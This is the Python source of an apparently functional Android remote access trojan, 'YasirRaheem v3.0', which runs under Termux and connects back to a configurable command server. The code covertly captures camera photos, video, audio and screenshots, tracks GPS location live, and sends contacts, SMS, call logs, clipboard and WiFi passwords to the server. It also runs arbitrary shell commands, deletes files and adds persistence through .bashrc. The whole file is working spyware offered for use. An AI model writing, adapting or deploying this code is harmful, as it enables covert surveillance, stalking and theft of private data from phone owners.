#!/usr/bin/env python3
# YasirRaheem v3.0 - Full Android Client
import socket
import subprocess
import os
import sys
import time
import json
import base64
import threading

SERVER_IP = '127.0.0.1'  # CHANGE THIS
SERVER_PORT = 5555
BUFFER = 65536
CURRENT_DIR = os.getcwd()

def cmd(c, timeout=30):
    """Run shell command and return output"""
    try:
        r = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=timeout)
        return r.decode('utf-8', errors='replace')
    except Exception as e:
        return f"[-] {str(e)}"

def cam_front():
    """Take photo with front camera"""
    r = cmd("termux-camera-photo -c 0 /sdcard/YRS_front.jpg 2>&1")
    if "error" not in r.lower():
        return "[+] Front camera photo saved: /sdcard/YRS_front.jpg"
    return "[-] Camera fail. Allow Termux camera permission."

def cam_back():
    """Take photo with back camera"""
    r = cmd("termux-camera-photo -c 1 /sdcard/YRS_back.jpg 2>&1")
    if "error" not in r.lower():
        return "[+] Back camera photo saved: /sdcard/YRS_back.jpg"
    return "[-] Camera fail. Allow Termux camera permission."

def cam_video(sec):
    """Record video"""
    r = cmd(f"termux-camera-record -c 1 --limit {sec} /sdcard/YRS_video.mp4 2>&1")
    if "error" not in r.lower():
        return f"[+] Video recorded ({sec}s): /sdcard/YRS_video.mp4"
    return "[-] Video fail"

def mic_rec(sec):
    """Record microphone"""
    r = cmd(f"termux-microphone-record -d -l {sec} /sdcard/YRS_audio.m4a 2>&1")
    if "error" not in r.lower():
        return f"[+] Audio recorded ({sec}s): /sdcard/YRS_audio.m4a"
    return "[-] Mic fail. Allow mic permission."

def get_location():
    """Get GPS location"""
    r = cmd("termux-location 2>&1")
    try:
        data = json.loads(r)
        return f"""
[LOCATION]
Latitude: {data.get('latitude', 'N/A')}
Longitude: {data.get('longitude', 'N/A')}
Accuracy: {data.get('accuracy', 'N/A')}m
Provider: {data.get('provider', 'N/A')}
Google Maps: https://maps.google.com/?q={data.get('latitude',0)},{data.get('longitude',0)}
"""
    except:
        return f"[-] Location fail: {r[:200]}"

def get_contacts():
    """Get all contacts"""
    r = cmd("termux-contact-list 2>&1")
    try:
        data = json.loads(r)
        out = "\n[CONTACTS]\n"
        for c in data[:50]:
            name = c.get('name', 'Unknown')
            number = c.get('number', 'No number')
            out += f"  {name}: {number}\n"
        out += f"\nTotal: {len(data)} contacts"
        return out
    except:
        return f"[-] Contacts fail: {r[:200]}"

def get_sms():
    """Get SMS inbox"""
    r = cmd("termux-sms-inbox 2>&1")
    try:
        data = json.loads(r)
        out = "\n[SMS INBOX]\n"
        for s in data[:30]:
            sender = s.get('number', 'Unknown')
            body = s.get('body', '')[:100]
            date = s.get('received', '')
            out += f"  From: {sender} | {date}\n  Msg: {body}\n\n"
        out += f"Total: {len(data)} messages"
        return out
    except:
        return f"[-] SMS fail: {r[:200]}"

def get_call_log():
    """Get call history"""
    r = cmd("termux-call-log 2>&1")
    try:
        data = json.loads(r)
        out = "\n[CALL LOG]\n"
        for c in data[:30]:
            num = c.get('number', 'Unknown')
            dur = c.get('duration', '0')
            date = c.get('date', '')
            out += f"  {num} | {dur}s | {date}\n"
        out += f"Total: {len(data)} calls"
        return out
    except:
        return f"[-] Call log fail: {r[:200]}"

def get_apps():
    """Get installed apps"""
    r = cmd("pm list packages -3 2>&1")  # User installed
    if r.startswith("[-]"):
        return r
    apps = r.replace("package:", "").split("\n")
    out = "\n[INSTALLED APPS (User)]\n"
    for a in apps[:50]:
        if a.strip():
            out += f"  {a}\n"
    out += f"\nTotal: {len(apps)} apps"
    return out

def get_full_info():
    """Complete device info"""
    info = f"""
╔══════════════════ DEVICE INFO ═══════════════════╗
Model: {cmd('getprop ro.product.model').strip()}
Manufacturer: {cmd('getprop ro.product.manufacturer').strip()}
Android: {cmd('getprop ro.build.version.release').strip()}
SDK: {cmd('getprop ro.build.version.sdk').strip()}
Build: {cmd('getprop ro.build.display.id').strip()}
Security Patch: {cmd('getprop ro.build.version.security_patch').strip()}
Serial: {cmd('getprop ro.serialno').strip()}
Phone: {cmd('getprop gsm.operator.alpha').strip()}
IMEI: {cmd('service call iphonesubinfo 1 | cut -d" " -f 2- | tr -d ".[:space:]"').strip()[:20]}
WiFi MAC: {cmd('cat /sys/class/net/wlan0/address').strip()}
Battery: {cmd('dumpsys battery | grep level').strip()}
Storage: {cmd('df -h /sdcard | tail -1').strip()}
RAM: {cmd("cat /proc/meminfo | grep MemTotal").strip()}
CPU: {cmd('cat /proc/cpuinfo | grep Hardware').strip()}
Hostname: {socket.gethostname()}
User: {os.getenv('USER', 'unknown')}
Python: {sys.version.split()[0]}
╚══════════════════════════════════════════════════╝
"""
    return info

def track_location(sock, stop_event):
    """Continuous location tracking"""
    while not stop_event.is_set():
        r = cmd("termux-location 2>&1")
        try:
            data = json.loads(r)
            loc = f"[LIVE] Lat: {data.get('latitude','N/A')}, Lon: {data.get('longitude','N/A')}"
            sock.send(loc.encode())
        except:
            sock.send(b"[LIVE] Location unavailable")
        time.sleep(5)

def client():
    global CURRENT_DIR
    
    # Check Termux:API
    chk = cmd("termux-wifi-scaninfo 2>&1")
    if "command not found" in chk.lower():
        print("[!] Install termux-api: pkg install termux-api")
        print("[!] Then grant all permissions in Android Settings")
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((SERVER_IP, SERVER_PORT))
            s.settimeout(None)
            
            track_stop = threading.Event()
            track_thread = None
            
            while True:
                try:
                    cmd_received = s.recv(BUFFER).decode().strip()
                except:
                    break
                
                if not cmd_received:
                    continue
                
                response = ""
                
                # Camera
                if cmd_received == 'cam':
                    response = cam_front()
                elif cmd_received == 'cam_back':
                    response = cam_back()
                elif cmd_received.startswith('cam_video '):
                    sec = cmd_received[10:]
                    response = cam_video(sec)
                
                # Mic
                elif cmd_received.startswith('mic '):
                    sec = cmd_received[4:]
                    response = mic_rec(sec)
                
                # Location
                elif cmd_received == 'location':
                    response = get_location()
                elif cmd_received == 'track start':
                    if track_thread and track_thread.is_alive():
                        response = "[-] Tracking already running"
                    else:
                        track_stop.clear()
                        track_thread = threading.Thread(target=track_location, args=(s, track_stop))
                        track_thread.daemon = True
                        track_thread.start()
                        response = "[+] Live tracking started (every 5s)"
                elif cmd_received == 'track stop':
                    if track_thread:
                        track_stop.set()
                        track_thread = None
                        response = "[-] Tracking stopped"
                    else:
                        response = "[-] No tracking running"
                
                # Contacts & SMS
                elif cmd_received == 'contacts':
                    response = get_contacts()
                elif cmd_received == 'sms':
                    response = get_sms()
                elif cmd_received == 'call_log':
                    response = get_call_log()
                
                # Device
                elif cmd_received == 'info':
                    response = get_full_info()
                elif cmd_received == 'apps':
                    response = get_apps()
                elif cmd_received == 'clipboard':
                    response = cmd("termux-clipboard-get 2>&1")
                elif cmd_received == 'wifi':
                    response = cmd("termux-wifi-scaninfo 2>&1") + "\n---\n" + cmd("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Need root for passwords'")
                elif cmd_received == 'battery':
                    response = cmd("termux-battery-status 2>&1")
                elif cmd_received == 'processes':
                    response = cmd("ps aux --sort=-%mem 2>/dev/null | head -30 || ps | head -30")
                elif cmd_received.startswith('toast '):
                    response = cmd(f'termux-toast "{cmd_received[6:]}" 2>&1')
                elif cmd_received.startswith('vibrate '):
                    ms = cmd_received[8:]
                    response = cmd(f"termux-vibrate -d {ms} 2>&1")
                elif cmd_received.startswith('tts '):
                    response = cmd(f'termux-tts-speak "{cmd_received[4:]}" 2>&1')
                elif cmd_received.startswith('volume '):
                    lvl = cmd_received[7:]
                    response = cmd(f"termux-volume music {lvl} 2>&1")
                elif cmd_received == 'screenshot':
                    response = cmd("termux-screenshot /sdcard/YRS_screen.jpg 2>&1")
                elif cmd_received == 'lock':
                    response = cmd("termux-screen-off 2>&1")
                
                # File system
                elif cmd_received == 'pwd':
                    response = f"[+] {CURRENT_DIR}"
                elif cmd_received.startswith('cd '):
                    try:
                        os.chdir(cmd_received[3:])
                        CURRENT_DIR = os.getcwd()
                        response = f"[+] {CURRENT_DIR}"
                    except Exception as e:
                        response = f"[-] {str(e)}"
                elif cmd_received.startswith('ls'):
                    path = cmd_received[3:].strip() if len(cmd_received) > 2 else CURRENT_DIR
                    response = cmd(f"ls -la '{path}' 2>&1 | head -50")
                elif cmd_received.startswith('cat '):
                    response = cmd(f"cat '{cmd_received[4:]}' 2>&1 | head -100")
                elif cmd_received.startswith('rm '):
                    response = cmd(f"rm -rf '{cmd_received[3:]}' && echo 'Deleted' 2>&1")
                elif cmd_received.startswith('find '):
                    response = cmd(f"find /sdcard -name '*{cmd_received[5:]}*' 2>/dev/null | head -30")
                
                # Download file
                elif cmd_received.startswith('download '):
                    fname = cmd_received[9:]
                    try:
                        with open(fname, 'rb') as f:
                            data = f.read()
                        encoded = base64.b64encode(data).decode()
                        response = f"FILE:{os.path.basename(fname)}:{len(data)}:{encoded}"
                    except Exception as e:
                        response = f"[-] Download fail: {str(e)}"
                
                # Upload file
                elif cmd_received.startswith('upload '):
                    response = "WAITING"
                    s.send(response.encode())
                    # Won't work in simple TCP - requires protocol
                    response = "[-] Upload via download from server"
                
                # Shell
                elif cmd_received.startswith('shell '):
                    response = cmd(cmd_received[6:], 60)
                
                # Persistence
                elif cmd_received == 'persist':
                    script_path = os.path.abspath(__file__)
                    with open(f'{os.path.expanduser("~")}/.bashrc', 'a') as f:
                        f.write(f'\n(sleep 10 && python3 {script_path}) &\n')
                    response = "[+] Persistence added to .bashrc"
                elif cmd_received == 'kill':
                    try:
                        cmd("sed -i '/sleep 10 && python3/d' ~/.bashrc")
                        response = "[-] Persistence removed"
                    except:
                        response = "[-] Failed"
                
                elif cmd_received == 'exit':
                    if track_thread:
                        track_stop.set()
                    s.close()
                    sys.exit(0)
                
                else:
                    response = f"[-] Unknown: {cmd_received}"
                
                try:
                    s.send(response.encode()[:BUFFER] + b'[DONE]')
                except:
                    break
            
            s.close()
            
        except KeyboardInterrupt:
            sys.exit(0)
        except Exception as e:
            time.sleep(5)
            continue

if __name__ == '__main__':
    client()
